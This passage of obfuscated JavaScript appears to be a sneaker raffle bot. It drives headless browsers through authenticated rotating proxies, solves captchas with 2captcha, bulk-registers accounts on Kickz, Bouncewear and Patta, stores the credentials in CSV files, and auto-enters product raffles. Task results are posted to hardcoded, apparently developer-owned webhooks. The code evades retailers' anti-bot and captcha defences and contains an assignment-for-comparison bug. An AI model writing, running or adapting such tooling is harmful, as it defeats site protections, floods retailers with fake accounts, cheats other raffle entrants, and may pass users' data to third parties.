            await _0x58eaef['waitForTimeout'](0x2bc), await _0x58eaef['type']('#checkout_shipping_address_city', '' + _0x2db2ad[_0x313d04]['City']), await _0x58eaef['waitForTimeout'](0x2bc), console['log'](_0x18cf54() + '\x20[' + _0x5a2f7f['name'] + ']\x20Task\x20' + (_0x313d04 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x58eaef, _0x58eaef['evaluate'](() => {
                const _0x27c47c = document['querySelector']('#continue_button');
                for (var _0x2711e8 = 0x0; _0x2711e8 < 0x5; _0x2711e8++) {
                    if (_0x27c47c) {
                        _0x27c47c['click'](), _0x27c47c['click']();
                        break;
                    } else
                        _0x73378f(0xfa0);
                }
            }), await _0x58eaef['waitForTimeout'](0x1194);
            try {
                await _0x58eaef['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
            } catch {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x5a2f7f['name'] + ']\x20Task\x20' + (_0x313d04 + 0x1) + '\x20:\x20Proxy\x20Error'));
                continue;
            }
            _0x58eaef['evaluate'](() => {
                const _0x396037 = document['querySelector']('#continue_button');
                for (var _0x3afb8e = 0x0; _0x3afb8e < 0x5; _0x3afb8e++) {
                    if (_0x396037) {
                        _0x396037['click']();
                        break;
                    } else
                        _0x73378f(0xfa0);
                }
            }), await _0x58eaef['waitForTimeout'](0x7d0), console['log'](_0x18cf54() + '\x20[' + _0x5a2f7f['name'] + ']\x20Task\x20' + (_0x313d04 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x58eaef['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x58eaef['evaluate'](() => {
                const _0x3a7150 = document['querySelector']('#continue_button');
                for (var _0x50caae = 0x0; _0x50caae < 0x5; _0x50caae++) {
                    if (_0x3a7150) {
                        _0x3a7150['click']();
                        break;
                    } else
                        _0x73378f(0xfa0);
                }
            }), await _0x58eaef['waitForTimeout'](0x1194), await _0x58eaef['waitForSelector']('#continue_button'), _0x58eaef['evaluate'](() => {
                const _0x354c9c = document['querySelector']('#continue_button');
                for (var _0x1debcf = 0x0; _0x1debcf < 0x5; _0x1debcf++) {
                    if (_0x354c9c) {
                        _0x354c9c['click']();
                        break;
                    } else
                        _0x73378f(0xfa0);
                }
            });
            try {
                await _0x58eaef['waitForSelector']('div[data-step=\x22thank_you\x22]'), console['log'](_0x5ecce5['green'](_0x18cf54() + '\x20[' + _0x5a2f7f['name'] + ']\x20Task\x20' + (_0x313d04 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                if (_0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '')
                    try {
                        await _0x278fc0(_0x5690b2['webhook'], _0x19c51a['succesDEVMSG']);
                    } catch {
                    }
                await _0x73378f(0xc8), await _0x278fc0(_0x4c279b, _0x19c51a['succesDEVMSG']), await _0x73378f(0xc8);
                try {
                    await _0x278fc0(_0x319480, _0x19c51a['succesPUBMSG']);
                } catch {
                }
            } catch (_0x59caa5) {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x5a2f7f['name'] + ']\x20Task\x20' + (_0x313d04 + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x59caa5));
            }
        } catch (_0x452198) {
            console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x5a2f7f['name'] + ']\x20Task\x20' + (_0x313d04 + 0x1) + '\x20:\x20' + _0x452198)), _0x378cbe = '' + _0x452198;
            var _0x4406fd = await _0x3553d9(_0x2db2ad[_0x313d04], _0x5a2f7f, 'dev', !![], _0x378cbe);
            _0x19c51a['errorDEV'] = { 'embeds': [_0x4406fd] }, _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x19c51a['errorDEV']), await _0x278fc0(_0x51b669, _0x19c51a['errorDEV']), _0xb49b77 = 'yes';
        } finally {
            _0x43911d && _0x43911d['close']();
            if (_0xb49b77 == 'yes' && _0x24e263 != 0x5 && _0x378cbe != 'Size\x20Not\x20Found') {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x5a2f7f['name'] + ']\x20Task\x20' + (_0x313d04 + 0x1) + '\x20:\x20Retrying')), _0x313d04 = _0x313d04 - 0x1, _0x24e263 = _0x24e263 + 0x1;
                continue;
            }
            if (_0x313d04 + 0x1 == _0x2db2ad['length']) {
                console['log'](_0x5ecce5['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x73378f(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x5690b2['AfewDelay'] + '\x20ms'), await _0x73378f(_0x5690b2['AfewDelay']);
        }
    }
};
async function _0x441c87(_0x61c05, _0x54566e, _0x181592, _0x2b705d) {
    _0x4baac5['use'](_0x3f14b2()), _0x4baac5['use'](_0x318e48({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5690b2['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x39d5c9 = 0x0; _0x39d5c9 < _0x181592['length']; _0x39d5c9++) {
        var _0x2676d7 = '', _0x139b44 = 0x0;
        _0x992352(_0x54566e['name'] + '\x20Task\x20' + (_0x39d5c9 + 0x1) + '\x20/\x20' + _0x181592['length'] + '\x20||\x20File:\x20' + _0x3dc3e8 + '\x20Proxies:\x20' + _0x261ffa), await _0x3e6cb2(_0x181592, _0x39d5c9);
        var _0x39f8b1 = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x5746a9
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5690b2['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x2f0e91
                }
            ]
        }];
        const _0x4f5048 = { 'embeds': _0x39f8b1 };
        var _0x12abea = await _0x3553d9(_0x181592[_0x39d5c9], _0x54566e, 'acc', ![]);
        const _0x27f62f = { 'succesDEVMSG': { 'embeds': [_0x12abea] } };
        if (_0x181592[_0x39d5c9]['Email'] == '' || _0x181592[_0x39d5c9]['FirstName'] == '' || _0x181592[_0x39d5c9]['LastName'] == '') {
            console['log'](_0x18cf54() + '\x20[' + _0x54566e['name'] + ']\x20Task\x20' + (_0x39d5c9 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        _0x181592[_0x39d5c9]['Password'] == '' && (_0x181592[_0x39d5c9]['Password'] = 'JRaffles23!');
        if (_0x5690b2['useRandomProxy'] = ![])
            var _0x1b5f7e = _0x2b705d[_0x39d5c9]['split'](':');
        else
            var _0x35f227 = Math['round'](Math['random']() * (_0x2b705d['length'] - 0x1)), _0x1b5f7e = _0x2b705d[_0x35f227]['split'](':');
        const _0x5c66ff = await _0x4baac5['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x1b5f7e[0x0] + ':' + _0x1b5f7e[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0xa235d9 = await _0x5c66ff['newPage']();
            await _0xa235d9['authenticate']({
                'username': '' + _0x1b5f7e[0x2],
                'password': '' + _0x1b5f7e[0x3]
            }), console['log'](_0x18cf54() + '\x20[' + _0x54566e['name'] + ']\x20Task\x20' + (_0x39d5c9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xa235d9['setRequestInterception'](!![]), _0xa235d9['on']('request', _0x4bd4a6 => {
                _0x4bd4a6['resourceType']() === 'image' || _0x4bd4a6['resourceType']() === 'font' || _0x4bd4a6['resourceType']() === 'media' ? _0x4bd4a6['abort']() : _0x4bd4a6['continue']();
            }), await _0xa235d9['goto'](_0x61c05), await _0x73378f(0xbb8), console['log'](_0x18cf54() + '\x20[' + _0x54566e['name'] + ']\x20Task\x20' + (_0x39d5c9 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0xa235d9['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xa235d9['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xa235d9['waitForSelector']('#button-register'), await _0x73378f(0x7d0), await _0xa235d9['evaluate'](() => {
                const _0x3d1e6b = document['querySelector']('#button-register');
                _0x3d1e6b['click']();
            }), console['log'](_0x18cf54() + '\x20[' + _0x54566e['name'] + ']\x20Task\x20' + (_0x39d5c9 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x73378f(0x1388), await _0xa235d9['waitForSelector']('#customer_salutation'), await _0xa235d9['select']('#customer_salutation', 'mr'), await _0x73378f(0x7d0), await _0xa235d9['waitForSelector']('#customer_firstname'), await _0xa235d9['type']('#customer_firstname', '' + _0x181592[_0x39d5c9]['FirstName']), await _0x73378f(0x352), await _0xa235d9['waitForSelector']('#customer_lastname'), await _0xa235d9['type']('#customer_lastname', '' + _0x181592[_0x39d5c9]['LastName']), await _0x73378f(0x352), await _0xa235d9['type']('#email-input', '' + _0x181592[_0x39d5c9]['Email']), await _0x73378f(0x352), await _0xa235d9['type']('#email-confirm-input', '' + _0x181592[_0x39d5c9]['Email']), await _0x73378f(0x352), await _0xa235d9['type']('#register-password', '' + _0x181592[_0x39d5c9]['Password']), await _0x73378f(0x352), await _0xa235d9['type']('#password-confirm', '' + _0x181592[_0x39d5c9]['Password']), await _0x73378f(0x352), console['log'](_0x18cf54() + '\x20[' + _0x54566e['name'] + ']\x20Task\x20' + (_0x39d5c9 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0xa235d9['click']('#consent'), await _0x73378f(0x1f4);
            const _0x1f2bec = await _0xa235d9['$']('div.inputErrorMsg.b-form_section-message');
            if (_0x1f2bec) {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x54566e['name'] + ']\x20Task\x20' + (_0x39d5c9 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                continue;
            }
            await _0xa235d9['click']('#buttonRegister');
            try {
                await _0xa235d9['waitForSelector']('#verificationCode');
            } catch {
                throw new Error('Account\x20already\x20registered');
            }
            console['log'](_0x5ecce5['yellow'](_0x18cf54() + '\x20[' + _0x54566e['name'] + ']\x20Task\x20' + (_0x39d5c9 + 0x1) + '\x20:\x20Account\x20' + _0x181592[_0x39d5c9]['Email'] + '\x20Generated!')), console['log'](_0x5ecce5['yellow'](_0x18cf54() + '\x20[' + _0x54566e['name'] + ']\x20Task\x20' + (_0x39d5c9 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x181592[_0x39d5c9]['Email'])), await _0x73378f(0x4b0);
            async function _0x447787() {
                console['log'](_0x5ecce5['yellow'](_0x18cf54() + '\x20[' + _0x54566e['name'] + ']\x20Task\x20' + (_0x39d5c9 + 0x1) + '\x20:\x20Paste\x20your\x20verification\x20code\x20here:'));
                var _0x4d7ba7 = await _0x5a99d6['get']('Code');
                return _0x4d7ba7['Code'];
            }
            ;
            code = await _0x447787(), _0x73378f(0x320), console['log'](_0x18cf54() + '\x20[' + _0x54566e['name'] + ']\x20Task\x20' + (_0x39d5c9 + 0x1) + '\x20:\x20Verifying..'), await _0xa235d9['type']('#verificationCode', code), await _0x73378f(0x1f4), await _0xa235d9['click']('#buttonVerify'), await _0x73378f(0x190), await _0xa235d9['click']('#buttonVerify'), await _0x73378f(0x3e8);
            try {
                await _0xa235d9['waitForSelector']('div.b-user_greeting'), console['log'](_0x5ecce5['green'](_0x18cf54() + '\x20[' + _0x54566e['name'] + ']\x20Task\x20' + (_0x39d5c9 + 0x1) + '\x20:\x20Account\x20' + _0x181592[_0x39d5c9]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x536860['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x181592[_0x39d5c9]['Email'] + ',' + _0x181592[_0x39d5c9]['Password'] + ','), console['log'](_0x18cf54() + '\x20[' + _0x54566e['name'] + ']\x20Task\x20' + (_0x39d5c9 + 0x1) + '\x20:\x20Account\x20' + _0x181592[_0x39d5c9]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                try {
                    _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x27f62f['succesDEVMSG']);
                } catch {
                }
                await _0x278fc0(_0x10deb2, _0x27f62f['succesDEVMSG']);
            } catch {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x54566e['name'] + ']\x20Task\x20' + (_0x39d5c9 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x54566e['name'] + ']\x20Task\x20' + (_0x39d5c9 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
            }
        } catch (_0x5cb50d) {
            console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x54566e['name'] + ']\x20Task\x20' + (_0x39d5c9 + 0x1) + '\x20:\x20' + _0x5cb50d)), _0x39f8b1[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x39f8b1[0x0]['description'] = '' + _0x5cb50d, await _0x278fc0(_0x51b669, _0x4f5048), _0x2676d7 = 'yes';
        } finally {
            _0x5c66ff && _0x5c66ff['close']();
            if (_0x2676d7 == 'yes' && _0x139b44 != 0x5) {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x54566e['name'] + ']\x20Task\x20' + (_0x39d5c9 + 0x1) + '\x20:\x20Retrying')), _0x39d5c9 = _0x39d5c9 - 0x1, _0x139b44 = _0x139b44 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x5690b2['delay'] + '\x20ms'), await _0x73378f(_0x5690b2['delay']);
        }
    }
}
async function _0x147c4d(_0x22dd9d, _0x55666d, _0x423a6d) {
    _0x4baac5['use'](_0x3f14b2()), _0x4baac5['use'](_0x318e48({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5690b2['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x21ffe4 = 0x0; _0x21ffe4 < _0x55666d['length']; _0x21ffe4++) {
        var _0x2c5ef8, _0x3ffeba = '', _0x14cfff = 0x0;
        _0x992352(_0x22dd9d['name'] + '\x20Task\x20' + (_0x21ffe4 + 0x1) + '\x20/\x20' + _0x55666d['length'] + '\x20||\x20File:\x20' + _0x3dc3e8 + '\x20Proxies:\x20' + _0x261ffa);
        var _0x2fca01 = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x5746a9
                },
                {
                    'name': 'Product',
                    'value': '' + _0x55666d[_0x21ffe4]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x55666d[_0x21ffe4]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5690b2['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x2f0e91
                }
            ]
        }], _0x2eca83 = await _0x3553d9(_0x55666d[_0x21ffe4], _0x22dd9d, 'dev', ![]), _0x6abab0 = await _0x3553d9(_0x55666d[_0x21ffe4], _0x22dd9d, 'pub', ![]);
        const _0x389f26 = {
            'succesDEVMSG': { 'embeds': [_0x2eca83] },
            'succesPUBMSG': { 'embeds': [_0x6abab0] }
        };
        await _0x3e6cb2(_0x55666d, _0x21ffe4);
        if (_0x55666d[_0x21ffe4]['Email'] == '' || _0x55666d[_0x21ffe4]['Password'] == '' || _0x55666d[_0x21ffe4]['FirstName'] == '' || _0x55666d[_0x21ffe4]['LastName'] == '') {
            console['log'](_0x18cf54() + '\x20[' + _0x22dd9d['name'] + ']\x20Task\x20' + (_0x21ffe4 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x5690b2['useRandomProxy'] = ![])
            var _0x4285b5 = _0x423a6d[_0x21ffe4]['split'](':');
        else
            var _0x49e02b = Math['round'](Math['random']() * (_0x423a6d['length'] - 0x1)), _0x4285b5 = _0x423a6d[_0x49e02b]['split'](':');
        const _0x2e8828 = await _0x4baac5['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x4285b5[0x0] + ':' + _0x4285b5[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x1ffa59 = await _0x2e8828['newPage']();
            await _0x1ffa59['authenticate']({
                'username': '' + _0x4285b5[0x2],
                'password': '' + _0x4285b5[0x3]
            }), console['log'](_0x18cf54() + '\x20[' + _0x22dd9d['name'] + ']\x20Task\x20' + (_0x21ffe4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1ffa59['setRequestInterception'](!![]), _0x1ffa59['on']('request', _0x222c8e => {
                _0x222c8e['resourceType']() === 'image' || _0x222c8e['resourceType']() === 'font' || _0x222c8e['resourceType']() === 'media' ? _0x222c8e['abort']() : _0x222c8e['continue']();
            }), await _0x1ffa59['goto']('' + _0x55666d[_0x21ffe4]['Url'], { 'waitUntil': 'networkidle2' }), await _0x73378f(0x12c);
            try {
                await _0x1ffa59['click']('a[title=\x22Sign\x20In\x22]');
            } catch {
                await _0x1ffa59['click']('a[title=\x22sign\x20in\x22]');
            }
            console['log'](_0x18cf54() + '\x20[' + _0x22dd9d['name'] + ']\x20Task\x20' + (_0x21ffe4 + 0x1) + '\x20:\x20Logging\x20in'), await _0x1ffa59['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1ffa59['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1ffa59['waitForSelector']('#username'), await _0x1ffa59['type']('#username', _0x55666d[_0x21ffe4]['Email']), await _0x1ffa59['waitForSelector']('#password'), await _0x1ffa59['type']('#password', _0x55666d[_0x21ffe4]['Password']), await _0x73378f(0x190), await _0x1ffa59['click']('#buttonSubmit'), await _0x1ffa59['waitForSelector']('div.b-user_greeting'), console['log'](_0x18cf54() + '\x20[' + _0x22dd9d['name'] + ']\x20Task\x20' + (_0x21ffe4 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x73378f(0x1f4), await _0x1ffa59['goto']('' + _0x55666d[_0x21ffe4]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x18cf54() + '\x20[' + _0x22dd9d['name'] + ']\x20Task\x20' + (_0x21ffe4 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x55666d[_0x21ffe4]['Size']);
            let _0x268e7e = _0x55666d[_0x21ffe4]['Size']['replace']('.5', '\x201/2');
            await _0x1ffa59['click']('button[title=\x22' + _0x268e7e + '\x22]'), await _0x73378f(0x1f4);
            try {
                await _0x1ffa59['click']('button[data-tau=\x22add_new_address\x22]');
            } catch {
            }
            await _0x73378f(0x12c), console['log'](_0x18cf54() + '\x20[' + _0x22dd9d['name'] + ']\x20Task\x20' + (_0x21ffe4 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1ffa59['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x73378f(0x12c), await _0x1ffa59['type']('#dwfrm_raffle_addressFields_firstName', _0x55666d[_0x21ffe4]['FirstName']), await _0x73378f(0x12c), await _0x1ffa59['type']('#dwfrm_raffle_addressFields_lastName', _0x55666d[_0x21ffe4]['LastName']), await _0x73378f(0x12c), await _0x1ffa59['select']('#dwfrm_raffle_addressFields_country', _0x55666d[_0x21ffe4]['Country']), await _0x73378f(0x12c), await _0x1ffa59['type']('#dwfrm_raffle_addressFields_city', _0x55666d[_0x21ffe4]['City']), await _0x73378f(0x12c);
            _0x55666d[_0x21ffe4]['Postcode'] == undefined && (_0x55666d[_0x21ffe4]['Postcode'] = _0x55666d[_0x21ffe4]['Zip']);
            await _0x1ffa59['type']('#dwfrm_raffle_addressFields_postalCode', _0x55666d[_0x21ffe4]['Postcode']), await _0x73378f(0x12c), await _0x1ffa59['type']('#dwfrm_raffle_addressFields_address1', _0x55666d[_0x21ffe4]['Address1']), await _0x73378f(0x12c), await _0x1ffa59['type']('#dwfrm_raffle_addressFields_address2', _0x55666d[_0x21ffe4]['HouseNumber']), await _0x73378f(0x12c), await _0x1ffa59['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x55666d[_0x21ffe4]['Address2']), await _0x73378f(0x12c), await _0x1ffa59['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x73378f(0x12c), await _0x1ffa59['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x55666d[_0x21ffe4]['Follower']), await _0x73378f(0x1f4), await _0x1ffa59['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x73378f(0x1f4), console['log'](_0x18cf54() + '\x20[' + _0x22dd9d['name'] + ']\x20Task\x20' + (_0x21ffe4 + 0x1) + '\x20:\x20' + _0x5ecce5['blue']('Awaiting\x20Paypal\x20Payment')), await _0x1ffa59['click']('.b-paypal_button');
            try {
                await _0x1ffa59['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), console['log'](_0x5ecce5['green'](_0x18cf54() + '\x20[' + _0x22dd9d['name'] + ']\x20Task\x20' + (_0x21ffe4 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x389f26['succesDEVMSG']), await _0x73378f(0xc8), await _0x278fc0(_0x4c279b, _0x389f26['succesDEVMSG']), await _0x73378f(0xc8), await _0x278fc0(_0x319480, _0x389f26['succesPUBMSG']);
            } catch (_0x10af69) {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x22dd9d['name'] + ']\x20Task\x20' + (_0x21ffe4 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x10af69)), _0x2c5ef8 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x10af69;
                var _0x37054d = await _0x3553d9(_0x55666d[_0x21ffe4], _0x22dd9d, 'dev', !![], _0x2c5ef8);
                _0x389f26['errorDEV'] = { 'embeds': [_0x37054d] }, _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x389f26['errorDEV']), await _0x278fc0(_0x51b669, _0x389f26['errorDEV']);
            }
        } catch (_0xf3d841) {
            console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x22dd9d['name'] + ']\x20Task\x20' + (_0x21ffe4 + 0x1) + '\x20:\x20' + _0xf3d841)), _0x2c5ef8 = '' + _0xf3d841;
            var _0x37054d = await _0x3553d9(_0x55666d[_0x21ffe4], _0x22dd9d, 'dev', !![], _0x2c5ef8);
            _0x389f26['errorDEV'] = { 'embeds': [_0x37054d] }, _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x389f26['errorDEV']), await _0x278fc0(_0x51b669, _0x389f26['errorDEV']), _0x3ffeba = 'yes';
        } finally {
            _0x2e8828 && _0x2e8828['close']();
            if (_0x3ffeba == 'yes' && _0x14cfff != 0x5) {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x22dd9d['name'] + ']\x20Task\x20' + (_0x21ffe4 + 0x1) + '\x20:\x20Retrying')), _0x21ffe4 = _0x21ffe4 - 0x1, _0x14cfff = _0x14cfff + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x5690b2['AfewDelay'] + '\x20ms'), await _0x73378f(_0x5690b2['AfewDelay']);
        }
    }
}
async function _0x5de0be(_0x1136d5, _0x196767) {
    _0x4baac5['use'](_0x3f14b2()), _0x4baac5['use'](_0x318e48({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5690b2['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x457d75 = 0x0; _0x457d75 < bouncewear['length']; _0x457d75++) {
        await _0x3e6cb2(bouncewear, _0x457d75);
        if (bouncewear[_0x457d75]['Email'] == '' || bouncewear[_0x457d75]['Password'] == '' || bouncewear[_0x457d75]['FirstName'] == '' || bouncewear[_0x457d75]['LastName'] == '') {
            console['log'](_0x18cf54() + '\x20[' + _0x49a3de[taskModule]['name'] + ']\x20Task\x20' + (_0x457d75 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x5690b2['useRandomProxy'] = ![])
            var _0xebc4b1 = _0x35d507()[_0x457d75]['split'](':');
        else
            var _0x5d62a5 = Math['round'](Math['random']() * (_0x35d507()['length'] - 0x1)), _0xebc4b1 = _0x35d507()[_0x5d62a5]['split'](':');
        const _0x4f4ad7 = await _0x4baac5['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0xebc4b1[0x0] + ':' + _0xebc4b1[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x15620c = await _0x4f4ad7['newPage']();
            await _0x15620c['authenticate']({
                'username': '' + _0xebc4b1[0x2],
                'password': '' + _0xebc4b1[0x3]
            }), console['log'](_0x18cf54() + '\x20[' + _0x196767['name'] + ']\x20Task\x20' + (_0x457d75 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x15620c['setRequestInterception'](!![]), _0x15620c['on']('request', _0x417c48 => {
                _0x417c48['resourceType']() === 'image' || _0x417c48['resourceType']() === 'font' || _0x417c48['resourceType']() === 'media' ? _0x417c48['abort']() : _0x417c48['continue']();
            }), await _0x15620c['goto'](_0x1136d5), await _0x73378f(0xbb8), await _0x15620c['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x18cf54() + '\x20[' + _0x196767['name'] + ']\x20Task\x20' + (_0x457d75 + 0x1) + '\x20:\x20Filling\x20information'), await _0x15620c['type']('#RegisterForm-FirstName', '' + bouncewear[_0x457d75]['FirstName']), await _0x73378f(0x226), await _0x15620c['type']('#RegisterForm-LastName', '' + bouncewear[_0x457d75]['LastName']), await _0x73378f(0x226), await _0x15620c['type']('#RegisterForm-email', '' + bouncewear[_0x457d75]['Email']), await _0x73378f(0x226), await _0x15620c['type']('#RegisterForm-password', '' + bouncewear[_0x457d75]['Password']), await _0x73378f(0x226), await _0x15620c['click']('#marketing'), console['log'](_0x18cf54() + '\x20[' + _0x196767['name'] + ']\x20Task\x20' + (_0x457d75 + 0x1) + '\x20:\x20Submitting..'), await _0x15620c['$eval']('#RegisterForm', _0x59e85d => _0x59e85d['submit']()), await _0x73378f(0x1f40), console['log'](_0x18cf54() + '\x20[' + _0x196767['name'] + ']\x20Task\x20' + (_0x457d75 + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x15620c['solveRecaptchas'](), await _0x15620c['click']('.shopify-challenge__button.btn');
            async function _0x4da228() {
                for (var _0x51a235 = 0x0; _0x51a235 < 0x4; _0x51a235++) {
                    try {
                        console['log']('try'), await _0x15620c['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x18cf54() + '\x20[' + _0x196767['name'] + ']\x20Task\x20' + (_0x457d75 + 0x1) + '\x20:\x20' + _0x5ecce5['red']('Catpcha\x20failed,\x20retrying..')), await _0x15620c['solveRecaptchas'](), await _0x15620c['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x4da228(), console['log'](_0x18cf54() + '\x20[' + _0x196767['name'] + ']\x20Task\x20' + (_0x457d75 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x73378f(0x1f4);
            try {
                await _0x15620c['waitForSelector']('.featured-title'), await _0x73378f(0x1f4), console['log'](_0x5ecce5['green'](_0x18cf54() + '\x20[' + _0x196767['name'] + ']\x20Task\x20' + (_0x457d75 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x457d75]['Email'] + '\x20Generated!')), _0x536860['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x457d75]['Email'] + ',' + bouncewear[_0x457d75]['Password']), console['log'](_0x5ecce5['yellow'](_0x18cf54() + '\x20[' + _0x196767['name'] + ']\x20Task\x20' + (_0x457d75 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x457d75]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x218759) {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x49a3de[taskModule]['name'] + ']\x20Task\x20' + (_0x457d75 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x218759));
            }
        } catch (_0x1b8fa9) {
            console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x49a3de[taskModule]['name'] + ']\x20Task\x20' + (_0x457d75 + 0x1) + '\x20:\x20' + _0x1b8fa9));
        } finally {
            _0x4f4ad7 && _0x4f4ad7['close'](), console['log']('Waiting\x20for\x20' + _0x5690b2['delay'] + '\x20ms'), await _0x73378f(_0x5690b2['delay']);
        }
    }
}
async function _0x32eccf(_0x44a2f5, _0x2bab09, _0xeb45d1, _0x9470c5) {
    _0x4baac5['use'](_0x3f14b2()), _0x4baac5['use'](_0x318e48({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5690b2['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0xe2b5c9 = 0x0; _0xe2b5c9 < _0xeb45d1['length']; _0xe2b5c9++) {
        var _0x2d9554 = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x5746a9
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5690b2['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x2f0e91
                }
            ]
        }];
        const _0x371087 = { 'embeds': _0x2d9554 };
